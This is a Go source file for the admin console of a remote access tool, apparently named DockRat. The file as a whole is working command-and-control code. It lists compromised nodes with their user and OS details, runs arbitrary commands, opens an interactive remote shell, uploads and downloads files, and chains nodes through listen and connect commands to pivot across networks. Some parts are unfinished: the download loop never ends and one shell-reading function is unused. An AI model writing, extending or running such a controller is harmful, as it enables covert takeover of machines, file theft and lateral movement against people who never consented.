package protocol

import (
	"bufio"
	"encoding/json"
	"fmt"
	"io"
	"os"
	"strings"

	"github.com/Singert/DockRat/core/node"
	"github.com/Singert/DockRat/core/utils"
)

var downloadChan = make(chan []byte, 100)

var currentNodeID = -1

func StartConsole(registry *node.Registry) {
	scanner := bufio.NewScanner(os.Stdin)
	for {
		fmt.Print("(admin) >> ")
		if !scanner.Scan() {
			break
		}
		input := strings.TrimSpace(scanner.Text())
		if input == "" {
			continue
		}

		tokens := strings.SplitN(input, " ", 2)
		cmd := tokens[0]
		arg := ""
		if len(tokens) > 1 {
			arg = tokens[1]
		}

		switch cmd {
		case "detail":
			handleDetail(registry)
		case "exec":
			handleExec(arg, registry)
		case "shell":
			handleShell(arg, registry)
		case "upload":
			handleUpload(arg, registry)
		case "download":
			handleDownload(arg, registry)
		case "listen":
			handleListen(arg, registry)
		case "connect":
			handleConnect(arg, registry)
		case "use":
			handleUse(arg, registry)
		case "topo":
			handleTopo(registry)
		default:
			fmt.Println("[-] Unknown command")
		}
	}
}

func handleDetail(reg *node.Registry) {
	nodes := reg.List()
	fmt.Println("[+] Connected nodes:")
	for _, n := range nodes {
		fmt.Printf("  Node[%d] -> IP: %s, Hostname: %s, User: %s, OS: %s, ParentID: %d\n",
			n.ID, n.Addr, n.Hostname, n.Username, n.OS, n.ParentID)
	}
}

func handleExec(arg string, reg *node.Registry) {
	parts := strings.SplitN(arg, " ", 2)
	if len(parts) != 2 {
		fmt.Println("[-] Usage: exec <node_id> <command>")
		return
	}
	id := parts[0]
	cmdStr := parts[1]
	var nid int
	fmt.Sscanf(id, "%d", &nid)
	n, ok := reg.Get(nid)
	if !ok {
		fmt.Println("[-] No such node")
		return
	}
	cmdPayload := map[string]string{"cmd": cmdStr}
	data, _ := json.Marshal(cmdPayload)
	msg := Message{
		Type:    MsgCommand,
		Payload: data,
	}
	buf, err := EncodeMessage(msg)
	if err != nil {
		fmt.Println("[-] Encode failed:", err)
		return
	}
	_, err = n.Conn.Write(buf)
	if err != nil {
		fmt.Println("[-] Send failed:", err)
		return
	}
}

func handleShell(arg string, reg *node.Registry) {
	var nid int
	fmt.Sscanf(arg, "%d", &nid)
	n, ok := reg.Get(nid)
	if !ok {
		fmt.Println("[-] No such node")
		return
	}
	msg := Message{
		Type:    MsgShell,
		Payload: []byte("start shell"),
	}
	buf, err := EncodeMessage(msg)
	if err != nil {
		fmt.Println("[-] Encode failed:", err)
		return
	}
	_, err = n.Conn.Write(buf)
	if err != nil {
		fmt.Println("[-] Send failed:", err)
		return
	}
	fmt.Println("[+] Shell started. Type commands (type 'exit' to quit):")
	inputScanner := bufio.NewScanner(os.Stdin)
	for {
		fmt.Print("remote$ ")
		if !inputScanner.Scan() {
			break
		}
		line := inputScanner.Text()
		if strings.TrimSpace(line) == "exit" {
			fmt.Println("[*] Exiting shell mode.")
			break
		}
		cmdMsg := Message{
			Type:    MsgShell,
			Payload: []byte(line + "\n"),
		}
		buf, err := EncodeMessage(cmdMsg)
		if err != nil {
			fmt.Println("[-] Shell encode error:", err)
			break
		}
		_, err = n.Conn.Write(buf)
		if err != nil {
			fmt.Println("[-] Shell write error:", err)
			break
		}
	}
}

func readShellOutput(conn io.Reader) {
	for {
		lengthBuf := make([]byte, 4)
		if _, err := io.ReadFull(conn, lengthBuf); err != nil {
			fmt.Println("[-] Shell read error:", err)
			return
		}
		length := utils.BytesToUint32(lengthBuf)
		data := make([]byte, length)
		if _, err := io.ReadFull(conn, data); err != nil {
			fmt.Println("[-] Shell read body error:", err)
			return
		}
		msg, err := DecodeMessage(data)
		if err != nil {
			fmt.Println("[-] Shell decode error:", err)
			return
		}
		if msg.Type == MsgShell {
			fmt.Printf(string(msg.Payload))
		}
	}
}

func handleUpload(arg string, registry *node.Registry) {
	parts := strings.SplitN(arg, " ", 3)
	if len(parts) != 3 {
		fmt.Println("[-] Usage: upload <node_id> <local_file> <remote_file>")
		return
	}
	var nid int
	fmt.Sscanf(parts[0], "%d", &nid)
	n, ok := registry.Get(nid)
	if !ok {
		fmt.Println("[-] No such node")
		return
	}
	file, err := os.Open(parts[1])
	if err != nil {
		fmt.Println("[-] Failed to open file:", err)
		return
	}
	defer file.Close()
	fileInfo, err := file.Stat()
	if err != nil {
		fmt.Println("[-] Failed to get file info:", err)
		return
	}
	initPayload := UploadInitPayload{
		Filename: parts[2],
		Filesize: fileInfo.Size(),
	}
	payloadBytes, err := json.Marshal(initPayload)
	if err != nil {
		fmt.Println("[-] Failed to marshal init payload:", err)
		return
	}
	msg := Message{
		Type:    MsgUploadInit,
		Payload: payloadBytes,
	}
	buf, err := EncodeMessage(msg)
	if err != nil {
		fmt.Println("[-] Message encode failed:", err)
		return
	}
	n.Conn.Write(buf)

	reader := bufio.NewReader(file)
	chunkSize := 4096
	bufData := make([]byte, chunkSize)
	for {
		nr, err := reader.Read(bufData)
		if nr > 0 {
			chunk := UploadChunkPayload{
				Data: bufData[:nr]}
			data, _ := json.Marshal(chunk)
			msg := Message{
				Type:    MsgUploadChunk,
				Payload: data,
			}
			pkt, _ := EncodeMessage(msg)
			n.Conn.Write(pkt)
		}
		if err == io.EOF {
			break
		}
		if err != nil {
			fmt.Println("Upload read error:", err)
			return
		}
	}
	done := Message{
		Type:    MsgUploadDone,
		Payload: []byte("done")}
	pkt, _ := EncodeMessage(done)
	n.Conn.Write(pkt)
	fmt.Println("[+] Upload completed")
}

func handleDownload(arg string, registry *node.Registry) {
	parts := strings.SplitN(arg, " ", 3)
	if len(parts) != 3 {
		fmt.Println("[-] Usage: download <node_id> <remote_file> <local_file>")
		return
	}
	var nid int
	fmt.Sscanf(parts[0], "%d", &nid)
	n, ok := registry.Get(nid)
	if !ok {
		fmt.Println("[-] No such node")
		return
	}
	req := DownloadInitPayload{Filename: parts[1]}
	data, _ := json.Marshal(req)
	msg := Message{Type: MsgDownloadInit, Payload: data}
	buf, _ := EncodeMessage(msg)
	n.Conn.Write(buf)

	out, err := os.Create(parts[2])
	if err != nil {
		fmt.Println("[-] Create file error:", err)
		return
	}
	defer out.Close()

	for chunk := range downloadChan {
		var payload DownloadChunkPayload
		json.Unmarshal(chunk, &payload)
		out.Write(payload.Data)
	}
	fmt.Println("[+] Download complete")
}

func handleListen(arg string, reg *node.Registry) {
	parts := strings.Split(arg, " ")
	if len(parts) != 2 {
		fmt.Println("[-] Usage: listen <node_id> <port>")
		return
	}
	var nid int
	fmt.Sscanf(parts[0], "%d", &nid)
	port := parts[1]

	n, ok := reg.Get(nid)
	if !ok {
		fmt.Println("[-] No such node")
		return
	}

	payload := map[string]string{
		"port": port,
	}
	data, _ := json.Marshal(payload)
	msg := Message{
		Type:    MsgListen,
		Payload: data,
	}
	buf, _ := EncodeMessage(msg)
	n.Conn.Write(buf)
	fmt.Println("[+] Listen command sent")
}

func handleConnect(arg string, reg *node.Registry) {
	parts := strings.Split(arg, " ")
	if len(parts) != 3 {
		fmt.Println("[-] Usage: connect <node_id> <ip:port> <parentID>")
		return
	}
	var nid, pid int
	fmt.Sscanf(parts[0], "%d", &nid)
	target := parts[1]
	fmt.Sscanf(parts[2], "%d", &pid)

	n, ok := reg.Get(nid)
	if !ok {
		fmt.Println("[-] No such node")
		return
	}

	payload := map[string]string{
		"target":    target,
		"parent_id": fmt.Sprintf("%d", pid),
	}
	data, _ := json.Marshal(payload)
	msg := Message{
		Type:    MsgConnect,
		Payload: data,
	}
	buf, _ := EncodeMessage(msg)
	n.Conn.Write(buf)
	fmt.Println("[+] Connect command sent")
}

func handleUse(arg string, reg *node.Registry) {
	var nid int
	fmt.Sscanf(arg, "%d", &nid)
	if _, ok := reg.Get(nid); !ok {
		fmt.Println("[-] No such node")
		return
	}
	currentNodeID = nid
	fmt.Printf("[+] Switched to node %d\n", nid)
}

func handleTopo(reg *node.Registry) {
	var printNode func(id int, depth int)
	printNode = func(id int, depth int) {
		n, ok := reg.Get(id)
		if !ok {
			return
		}
		fmt.Printf("%s[%d] %s@%s\n", strings.Repeat("  ", depth), id, n.Username, n.Hostname)
		for _, child := range reg.GetChildren(id) {
			printNode(child.ID, depth+1)
		}
	}

	fmt.Println("[+] Topology Tree:")
	for _, node := range reg.List() {
		if node.ParentID == -1 {
			printNode(node.ID, 0)
		}
	}
}
